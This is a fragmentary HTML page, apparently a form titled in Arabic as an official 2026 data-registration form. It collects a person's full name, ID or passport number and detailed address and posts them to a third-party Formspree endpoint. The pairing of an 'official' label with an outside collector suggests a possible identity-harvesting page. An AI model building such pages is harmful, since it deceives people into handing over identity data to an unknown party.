...
<head>
    ...
    <title>استمارة تسجيل البيانات الرسمية 2026</title>
    <style>
        body {
...
<div class="form-container">
    ...
    <form action="https://formspree.io/f/mqenrgba" method="POST">
        ...
        <div class="form-group">
            ...
            <input type="text" id="fullname" name="Full_Name" required placeholder="أدخل الاسم الكامل">
        </div>
        ...
        <div class="form-group">
            ...
            <input type="number" id="id_number" name="ID_or_Passport_Number" required placeholder="أدخل رقم الهوية أو الجواز">
        </div>
        ...
        <div class="form-group">
            ...
            <textarea id="address" name="Detailed_Address" rows="3" required placeholder="المدينة، الحي، الشارع..."></textarea>
        </div>
